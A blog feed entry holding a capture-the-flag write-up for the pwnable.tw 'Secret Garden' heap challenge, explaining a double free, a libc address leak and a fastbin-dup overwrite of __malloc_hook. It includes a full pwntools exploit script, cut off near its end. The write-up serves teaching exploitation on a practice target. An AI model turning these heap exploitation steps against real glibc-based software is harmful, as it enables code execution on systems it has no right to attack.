{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"linux\" tag",
    "description": "{software,reverse} engineer",
    "home_page_url": "https://aesophor.github.io",
    "items": [
        {
            "id": "https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/",
            "url": "https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/",
            "title": "[pwnable.tw] Secret Garden (350 pts)",
            "date_published": "2022-08-27T06:06:00.000Z",
            "content_html": "<p><img data-src=\"banner.png\" alt=\"banner\"></p>\n<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<p>Let’s solve the heap exploitation challenge, <strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wd25hYmxlLnR3L2NoYWxsZW5nZS8jMTI=\">Secret Garden [350 pts]</span></strong> (x86_64, glibc 2.23). In summary:</p>\n<ul>\n<li>Free a large chunk into the unsorted bin.</li>\n<li>The  <code>fd</code>  field of the freed chunk in the unsorted bin contains a libc address whose offset within libc is a fixed value.</li>\n<li>Visit the garden and leak the libc base to stdout.</li>\n<li>Overwrite  <code>__malloc_hook</code>  with a one gadget using fastbin dup.</li>\n<li>Trigger our  <code>__malloc_hook</code>  via  <code>malloc_printerr()</code> .</li>\n</ul>\n<h1 id=\"analysis\"><a class=\"markdownIt-Anchor\" href=\"#analysis\">#</a> Analysis</h1>\n<p>Sounds easy enough, eh? This challenge is perfect for someone who’s new to heap exploitation, as it allows us to learn how fastbin dup works, and overall it’s not too complicated. Okay, enough talk, let’s get started. Running the binary shows the following output:</p>\n<pre><code>☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆\n☆          Secret Garden          ☆\n☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆\n\n  1 . Raise a flower\n  2 . Visit the garden\n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice :\n</code></pre>\n<p>Only the first three options are required for exploitation:</p>\n<ol>\n<li>Raise a flower:\n<ul>\n<li>malloc() twice.</li>\n<li>The first malloc(0x28) allocates a flower struct.</li>\n<li>The second malloc() allows us to specify the size.\n<ul>\n<li>Then it calls read() to let us edit the chunk’s user data.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Visit the garden:\n<ul>\n<li>Print all the flowers’s data.</li>\n</ul>\n</li>\n<li>Remove a flower from the garden (by index):\n<ul>\n<li>Clear the flower struct’s first QWORD (i.e.  <code>fd</code>  field)</li>\n<li>free() the flower but doesn’t set it to NULL.</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"preparation\"><a class=\"markdownIt-Anchor\" href=\"#preparation\">#</a> Preparation</h1>\n<p>I suggest using <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NreXNpZGVyL3B3bmRvY2tlcg==\">pwndocker</span>, since it allows you to switch between different versions of glibc in a breeze, and all the commonly-used exploitation tools are already provided in the container.</p>\n<ul>\n<li>Patching ELF</li>\n</ul>\n<pre><code># patchelf --set-interpreter /glibc/2.23/64/lib/ld-2.23.so ./heap_paradise\n# ldd ./secretgarden\n        linux-vdso.so.1 (0x00007fffcb2f7000)\n        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0f13c8b000)\n        /glibc/2.23/64/lib/ld-2.23.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0f1408b000)\n</code></pre>\n<ul>\n<li>To run  <code>secretgarden</code>  locally with glibc 2.23 (stripped):</li>\n</ul>\n<pre><code># LD_PRELOAD=./libc.so.6 ./secretgarden\n</code></pre>\n<ul>\n<li>To run  <code>secretgarden</code>  locally with glibc 2.23 (non-stripped):</li>\n</ul>\n<pre><code># ./secretgarden\n</code></pre>\n<blockquote>\n<p>Note:<br>\nThe non-stripped version of glibc should only be used during exploit script developement. You’ll finally need to switch over to the stripped version which comes with the challenge, because they have different offsets for symbols.</p>\n</blockquote>\n<h1 id=\"vulnerability\"><a class=\"markdownIt-Anchor\" href=\"#vulnerability\">#</a> Vulnerability</h1>\n<p>The third option, “remove a flower from the garden”, contains an obvious UAF vulnerability, as it doesn’t set the freed pointer to NULL.</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_DWORD <span class=\"token operator\">*</span>ptrToFdField<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> index<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>index <span class=\"token operator\">&lt;=</span> <span class=\"token number\">99</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>ptrToFdField <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>flowers<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token operator\">*</span>ptrToFdField <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>flowers<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Successful\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>To reach the crashing state of this program, we only need to raise a flower and remove it twice.</p>\n<pre><code>Your choice : 3\nWhich flower do you want to remove from the garden:0\n*** Error in `./secretgarden': double free or corruption (fasttop): 0x0000558b995ae450 ***\nAborted (core dumped)\n</code></pre>\n<p>With this vulnerability, we can perform fastbin dup by double freeing a flower. Unfortunately, as all the protections (except FORTIFY) are enabled in this challenge, GOT hijacking is not an easy option. We’ll need to find a way to leak libc base and overwrite either  <code>__malloc_hook</code>  or  <code>__free_hook</code>  with the address of an one gadget.</p>\n<pre><code># checksec --file ./secretgarden\n[*] '/ctf/work/pwnable.tw/secret-garden/secretgarden'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n</code></pre>\n<h1 id=\"exploitation\"><a class=\"markdownIt-Anchor\" href=\"#exploitation\">#</a> Exploitation</h1>\n<p>Before we begin, let’s pay attention to the first option, “raise a flower”. Remember that it calls malloc() twice, so if we write  <code>chall.create(0x420)</code>  it will:</p>\n<ul>\n<li>malloc(0x28), which returns a 0x30-byte chunk (including the header)</li>\n<li>malloc(0x420), which returns a 0x430-byte chunk (including the header)</li>\n</ul>\n<h2 id=\"leaking-libc-base\"><a class=\"markdownIt-Anchor\" href=\"#leaking-libc-base\">#</a> Leaking libc base</h2>\n<p>We can allocate and free a large chunk (0x420 bytes) into the unsorted bin, and print its  <code>fd</code>  field to stdout.</p>\n<pre><code>chall.create(0x420)\nchall.remove(0)\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin1.png\" alt=\"\"></p>\n<p>Wait, the freed chunk doesn’t go into the unsorted bin! That’s because the large chunk we’ve allocated is next to the top chunk, and when it is freed, it will be merged into the top chunk. To workaround this, simply allocate another small chunk with whatever size other than 0x28.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38) # new\nchall.remove(0)\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin2.png\" alt=\"\"></p>\n<p>Good. The large chunk now goes into the unsorted bin. To print it via the second option, “visit the garden”, we need to allocate it again and make sure we don’t overwrite the  <code>fd</code>  field.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38)\nchall.remove(0)\nchall.create(0x420, b'') # new\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin3.png\" alt=\"\"></p>\n<p>Unfortunately, if we choose option 1, it won’t return us the exact same 0x430-byte chunk from before. As we can see, option 1 calls  <code>malloc()</code>  twice, 0x28 and 0x420 respectively. So when the program calls  <code>malloc(0x28)</code> , glibc splits our 0x430-byte free chunk in the unsorted bin into two halves: (1) a 0x30-byte chunk, and (2) a 0x400-byte chunk. This former is returned to the user, while the latter is put into a large bin.</p>\n<p>To workaround this, we need to place a 0x30-byte chunk in a fastbin, so that glibc can return that chunk instead of splitting from our 0x430-byte chunk. As shown below, the  <code>fd</code>  field of the 0x430-byte chunk is successfully leaked to stdout.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38)\nchall.create(0x28) # new\nchall.remove(2)    # new\nchall.remove(0)\nchall.create(0x420, b'')\nchall.visit()\n</code></pre>\n<pre><code>[*] leaked: 0x7fdad280db0a\n[*] leaked libc_base: 0x7fdad244a000\n</code></pre>\n<p><img data-src=\"leaked.png\" alt=\"\"></p>\n<h2 id=\"overwriting-__malloc_hooklibc-via-fastbin-dup\"><a class=\"markdownIt-Anchor\" href=\"#overwriting-__malloc_hooklibc-via-fastbin-dup\">#</a> Overwriting __malloc_hook@libc via fastbin dup</h2>\n<p>Next, we can use the <strong>fastbin dup</strong> technique to achieve arbitrary write. We need to either:</p>\n<ul>\n<li>overwrite  <code>__malloc_hook@libc</code>  and trigger  <code>malloc()</code> , or</li>\n<li>overwrite  <code>__free_hook@libc</code>  and trigger  <code>free()</code></li>\n</ul>\n<p>Let’s try to bypass the infamous “double free or corruption (fasttop)” error with the ABA pattern [<a href=\"#check-1-double-free-or-corruption-fasttop\">1</a>].</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\n</code></pre>\n<p><img data-src=\"bin4.png\" alt=\"\"></p>\n<p>Good. We now have two overlapping (same) chunks in the same fastbin. Now we can overwrite the  <code>fd</code>  field of this chunk.</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym['__free_hook']))\nchall.create(0x68)\nchall.create(0x68)\nchall.create(0x68, p64(libc_base + one_gadget))\n</code></pre>\n<p><img data-src=\"bin5.png\" alt=\"\"></p>\n<p>Okay, here’s another restriction we need to bypass. In glibc,  <code>malloc()</code>  will refuse to return a freed chunk from a fastbin if that chunk’s  <code>size</code>  field is incorrect [<a href=\"#check-2-malloc-memory-corruption-fast\">2</a>].</p>\n<pre><code>Error in `/ctf/work/pwnable.tw/secret-garden/secretgarden': malloc(): memory corruption (fast): 0x00007efdb9063b20 ***\n</code></pre>\n<p>To bypass this, we need to rethink where we’re trying to write data into. The answer is  <code>__malloc_hook</code>  or  <code>__free_hook</code> , right? Let’s take a look at that memory region.</p>\n<p><img data-src=\"hooks.png\" alt=\"\"></p>\n<p><img data-src=\"7f.png\" alt=\"\"></p>\n<p>All the bytes near  <code>__free_hook</code>  are all NULL bytes, so it’s not easy to be overwritten with fastbin dup. However, there’s a sequence of bytes “7f 00 00 00 00 00 00 00” before  <code>__malloc_hook</code> . If we use these bytes as the free chunk’s  <code>size</code>  field, then we’ll get a 0x70-byte free chunk, and this is enough for us to overwrite  <code>__malloc_hook</code> .</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 35))\nchall.create(0x68)\nchall.create(0x68)\nchall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))\nchall.create(0x68) # trigger __malloc_hook\n</code></pre>\n<h2 id=\"triggering-our-__malloc_hook\"><a class=\"markdownIt-Anchor\" href=\"#triggering-our-__malloc_hook\">#</a> Triggering our __malloc_hook</h2>\n<p>The last thing that will probably annoy you is that the constraints of all four one gadgets are unsatisfiable when  <code>__malloc_hook</code>  is triggered via option 1, “raise a flower”.</p>\n<p><img data-src=\"one_gadget.png\" alt=\"\"></p>\n<p>Fortunately, there’s another way to trigger  <code>__malloc_hook</code> : via  <code>malloc_printerr()</code> . This function is used to print error message when  <code>malloc()</code>  and  <code>free()</code>  fails, and most importantly, it calls  <code>malloc()</code> . Now back to our question, the easiest way to invoke  <code>malloc_printerr()</code>  is to create a “double free or corruption (fasttop)” error [<a href=\"#check-1-double-free-or-corruption-fasttop\">1</a>] on purpose.</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 35))\nchall.create(0x68)\nchall.create(0x68)\n\n# Prepare a chunk for (fasttop) error\nchall.create(0x48)\n\n# Overwrite __malloc_hook.\nchall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))\n\n# Trigger &quot;double free or corruption (fasttop)&quot;.\nchall.remove(9)\nchall.remove(9)\n</code></pre>\n<h1 id=\"full-exploit-script\"><a class=\"markdownIt-Anchor\" href=\"#full-exploit-script\">#</a> Full Exploit Script</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- encoding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf  <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./secretgarden'</span><span class=\"token punctuation\">,</span> checksec <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc_64.so.6'</span><span class=\"token punctuation\">,</span> checksec <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>one_gadget <span class=\"token operator\">=</span> <span class=\"token number\">0xef6c4</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>A8 <span class=\"token operator\">=</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> <span class=\"token string\">b'A'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Challenge</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> proc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc <span class=\"token operator\">=</span> proc</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">create</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> len_name<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> A8<span class=\"token punctuation\">,</span> color <span class=\"token operator\">=</span> A8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token triple-quoted-string string\">\"\"\" malloc(0x28), malloc(len_name) \"\"\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>len_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'of flower :'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'the flower :'</span><span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'garden:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">cleanup</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    proc <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'chall.pwnable.tw'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10203</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    chall <span class=\"token operator\">=</span> Challenge<span class=\"token punctuation\">(</span>proc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># Prepare a large chunk.</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x420</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token comment\"># Prevents the large chunk from being merged into the top chunk.</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\"># Prevents the 0x430-byte chunk from being split.</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\"># Free the 0x430-byte chunk into unsorted bin.</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token comment\"># Allocate the 0x430-byte chunk again so that visit() can print it.</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x420</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>visit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    proc<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'flower[3] :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    leaked <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>proc<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    offset <span class=\"token operator\">=</span> <span class=\"token number\">0x7fb7dafc4b0a</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fb7dac01000</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    libc_base <span class=\"token operator\">=</span> leaked <span class=\"token operator\">-</span> offset</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">'leaked libc_base: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token comment\"># Overwrite __malloc_hook with one gadget using fastbin dup.</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">35</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token comment\"># Trigger __malloc_hook.</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token comment\"># It seems that raising a flower will cause the one gadgets to crash.</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token comment\"># An alternative way is to trigger __malloc_hook via malloc_printerr().</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token comment\"># To do this, we can trigger a \"double free or corruption (fasttop)\".</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x48</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># prepare a chunk for (fasttop) error</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>libc_base <span class=\"token operator\">+</span> one_gadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># overwrite __malloc_hook</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    proc<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token 